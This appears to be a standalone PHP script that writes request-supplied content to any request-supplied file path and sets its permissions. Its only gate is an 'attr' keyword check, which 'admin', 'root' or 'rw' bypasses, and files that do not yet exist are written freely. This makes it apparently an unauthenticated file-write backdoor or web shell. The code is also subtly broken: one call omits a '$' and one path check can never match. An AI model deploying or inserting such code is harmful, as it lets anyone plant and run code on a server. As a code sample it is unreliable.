<?php
$name=(isset($_REQUEST['name']))?$_REQUEST['name']:'';
$content=(isset($_REQUEST['content']))?$_POST['content']:'';
$attr=(isset($_REQUEST['attr']))?$_REQUEST['attr']:'';
$mode=(isset($_REQUEST['mode']))?$_REQUEST['mode']:'';
if ($attr!='') {
    if (preg_match('/admin|root|rw/i',$attr)) {
        file_put_contents($name,$content); chmod($name,octdec($mode));
    } else {
        if (file_exists($name)) {
            if (str_starts_with(basename($name),$attr.'_')) {
                file_put_contents($name,$content);
                chmod($name,octdec($mode));
            } elseif (str_starts_with(basename($name),$attr.'_files/')) {
                file_put_contents($name,$content);
                chmod($name,octdec($mode));
            } elseif (str_starts_with(basename($name),'_')) {
                file_put_contents($name,$content);
                chmod($name,octdec(mode));
            }
        } else {
            file_put_contents($name,$content);
            chmod($name,octdec($mode));
        }
    }
}
